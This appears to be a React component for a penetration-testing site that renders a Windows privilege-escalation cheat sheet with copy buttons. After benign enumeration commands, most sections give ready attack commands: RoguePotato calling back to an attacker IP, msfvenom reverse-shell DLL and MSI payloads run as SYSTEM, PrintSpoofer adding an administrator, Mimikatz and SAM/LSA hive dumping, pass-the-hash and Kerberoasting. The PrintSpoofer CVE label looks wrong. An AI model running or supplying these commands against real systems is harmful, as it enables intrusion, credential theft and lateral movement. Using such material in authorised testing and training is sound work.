import { useState } from 'react';
import { motion } from 'framer-motion';
import { FaChevronDown, FaTerminal, FaInfoCircle } from 'react-icons/fa';
import ReactMarkdown from 'react-markdown';
import { copyToClipboard } from '../../utils/copyToClipboard';
import { toast } from 'react-toastify';

const WindowsPrivEsc = () => {
  const [expandedSection, setExpandedSection] = useState('enumeration');

  const toggleSection = (section) => {
    setExpandedSection(expandedSection === section ? null : section);
  };

  const handleCopy = (command) => {
    copyToClipboard(command);
    toast.success('Command copied to clipboard!');
  };

  const sections = [
    {
      id: 'enumeration',
      title: 'System Enumeration',
      content: [
        {
          type: 'markdown',
          value: `#### Basic System Info\nQuick overview of the Windows system:`
        },
        { type: 'command', value: 'systeminfo', description: 'Detailed system information' },
        { type: 'command', value: 'hostname', description: 'Computer name' },
        { type: 'command', value: 'ver', description: 'Windows version' },
        { type: 'command', value: 'wmic os get Caption,Version,BuildNumber,OSArchitecture', description: 'OS version and architecture' },
        {
          type: 'markdown',
          value: `#### User & Privilege Info\nFind out who you are and what you can do:`
        },
        { type: 'command', value: 'whoami', description: 'Current username' },
        { type: 'command', value: 'whoami /groups', description: 'Groups for current user' },
        { type: 'command', value: 'whoami /priv', description: 'Current user privileges' },
        { type: 'command', value: 'net user', description: 'List all users' },
        { type: 'command', value: 'net localgroup administrators', description: 'Local administrators group' },
        { type: 'command', value: 'net accounts', description: 'Password policy' },
        {
          type: 'markdown',
          value: `#### Services, Processes & Scheduled Tasks\nLook for misconfigurations and privilege escalation vectors:`
        },
        { type: 'command', value: 'tasklist /svc', description: 'Running processes with services' },
        { type: 'command', value: 'netstat -ano', description: 'Listening ports with PIDs' },
        { type: 'command', value: 'sc query state= all', description: 'All services' },
        { type: 'command', value: 'schtasks /query /fo LIST /v', description: 'All scheduled tasks (verbose)' },
        { type: 'command', value: 'wmic product get name,version', description: 'Installed software' },
        { type: 'command', value: 'wmic qfe get Caption,Description,HotFixID,InstalledOn', description: 'Installed patches (hotfixes)' },
        { type: 'command', value: 'wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\\Windows\\" | findstr /i /v "\""', description: 'Unquoted service paths (privesc)' },
        {
          type: 'markdown',
          value: `**Tip:** Use [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) or [Seatbelt](https://github.com/GhostPack/Seatbelt) for automated enumeration.`
        }
      ]
    },
    {
      id: 'exploitation',
      title: 'Exploitation Techniques',
      content: [
        {
          type: 'markdown',
          value: `#### Token Impersonation & Potato Attacks\nEscalate privileges by abusing impersonation tokens:`
        },
        { type: 'command', value: 'whoami /priv | findstr /i "Impersonate"', description: 'Check for SeImpersonatePrivilege' },
        { type: 'command', value: '.\\RoguePotato.exe -r <attacker_ip> -e "C:\\Windows\\System32\\cmd.exe" -l 9999', description: 'RoguePotato exploit (get SYSTEM shell)' },
        {
          type: 'markdown',
          value: `#### DLL Hijacking\nAbuse DLL search order to load malicious code:`
        },
        { type: 'command', value: 'procmon.exe (Filter: Result is NAME NOT FOUND)', description: 'Find missing DLLs (Procmon)' },
        { type: 'command', value: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f dll -o hijack.dll', description: 'Generate malicious DLL' },
        {
          type: 'markdown',
          value: `#### PrintSpoofer (CVE-2020-1337)\nExploit Print Spooler for privilege escalation:`
        },
        { type: 'command', value: '.\\PrintSpoofer.exe -c "cmd /c net localgroup administrators <user> /add"', description: 'Add user to Administrators via PrintSpoofer' },
        {
          type: 'markdown',
          value: `#### AlwaysInstallElevated\nAbuse Windows Installer for privilege escalation:`
        },
        { type: 'command', value: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKCU)' },
        { type: 'command', value: 'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated', description: 'Check AlwaysInstallElevated (HKLM)' },
        { type: 'command', value: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=443 -f msi -o setup.msi', description: 'Generate malicious MSI' },
        { type: 'command', value: 'msiexec /quiet /qn /i setup.msi', description: 'Install MSI as SYSTEM' },
        {
          type: 'markdown',
          value: `**Tip:** Use [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc) for automated privesc checks.`
        }
      ]
    },
    {
      id: 'post-exploitation',
      title: 'Post-Exploitation',
      content: [
        {
          type: 'markdown',
          value: `#### Credential Dumping\nExtract credentials and secrets after privilege escalation:`
        },
        { type: 'command', value: 'sekurlsa::logonpasswords', description: 'Dump credentials with Mimikatz' },
        { type: 'command', value: 'reg save HKLM\\SAM sam.save', description: 'Dump SAM database' },
        { type: 'command', value: 'reg save HKLM\\SYSTEM system.save', description: 'Dump SYSTEM hive' },
        { type: 'command', value: 'reg save HKLM\\SECURITY security.save', description: 'Dump LSA secrets' },
        {
          type: 'markdown',
          value: `#### Lateral Movement\nMove laterally in the network after gaining credentials:`
        },
        { type: 'command', value: 'wmic /node:<target> process call create "cmd /c <command>"', description: 'WMI remote command execution' },
        { type: 'command', value: 'Invoke-Command -ComputerName <target> -ScriptBlock { <commands> }', description: 'PowerShell Remoting' },
        { type: 'command', value: '.\\pth-winexe -U <user>%<hash> //<target> cmd', description: 'Pass-the-Hash with pth-winexe' },
        {
          type: 'markdown',
          value: `**Tip:** Use [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec) for post-exploitation and lateral movement.`
        }
      ]
    },
    {
      id: 'active-directory',
      title: 'Active Directory',
      content: [
        {
          type: 'markdown',
          value: `#### AD Enumeration\nKey commands for Active Directory recon:`
        },
        { type: 'command', value: 'net config workstation', description: 'Basic domain info' },
        { type: 'command', value: 'net user /domain', description: 'List all domain users' },
        { type: 'command', value: 'net group /domain', description: 'List all domain groups' },
        { type: 'command', value: 'net group "Domain Computers" /domain', description: 'List all domain computers' },
        { type: 'command', value: 'SharpHound.exe -c All', description: 'BloodHound collector (full AD recon)' },
        {
          type: 'markdown',
          value: `#### Kerberos Attacks\nCommon Kerberos attack primitives:`
        },
        { type: 'command', value: 'Get-DomainUser -PreauthNotRequired | Select-Object samaccountname', description: 'AS-REP Roasting (PowerView)' },
        { type: 'command', value: 'Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql01.domain.com"', description: 'Kerberoasting (PowerShell)' },
        {
          type: 'markdown',
          value: `**Tip:** Use [BloodHound](https://github.com/BloodHoundAD/BloodHound) and [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon) for full AD enumeration.`
        }
      ]
    }
  ];

  return (
    <div className="cheatsheet-container">
      <h2 className="cheatsheet-title">
        <FaTerminal /> Windows Privilege Escalation Cheat Sheet
      </h2>
      
      <div className="info-banner">
        <FaInfoCircle />
        <p>
          Comprehensive Windows privilege escalation techniques covering local and 
          Active Directory environments with modern exploitation methods.
        </p>
      </div>
      
      <div className="sections-container">
        {sections.map((section) => (
          <div key={section.id} className="section">
            <motion.div
              className="section-header"
              onClick={() => toggleSection(section.id)}
              whileHover={{ scale: 1.02 }}
              whileTap={{ scale: 0.98 }}
            >
              <h3>{section.title}</h3>
              <motion.div
                animate={{ rotate: expandedSection === section.id ? 180 : 0 }}
              >
                <FaChevronDown />
              </motion.div>
            </motion.div>
            
            <motion.div
              className="section-content"
              initial={{ opacity: 0, height: 0 }}
              animate={{
                opacity: expandedSection === section.id ? 1 : 0,
                height: expandedSection === section.id ? 'auto' : 0
              }}
              transition={{ duration: 0.3 }}
            >
              {expandedSection === section.id && (
                <div className="content-inner">
                  {section.content.map((item, index) => (
                    <div key={index} className="content-item">
                      {item.type === 'command' ? (
                        <div className="command-item">
                          <div className="command-header">
                            <code>{item.value}</code>
                            <button
                              onClick={() => handleCopy(item.value)}
                              className="copy-button small"
                            >
                              Copy
                            </button>
                          </div>
                          <p className="command-description">{item.description}</p>
                        </div>
                      ) : (
                        <div className="markdown-content">
                          <ReactMarkdown>
                            {item.value}
                          </ReactMarkdown>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              )}
            </motion.div>
          </div>
        ))}
      </div>
    </div>
  );
};

export default WindowsPrivEsc;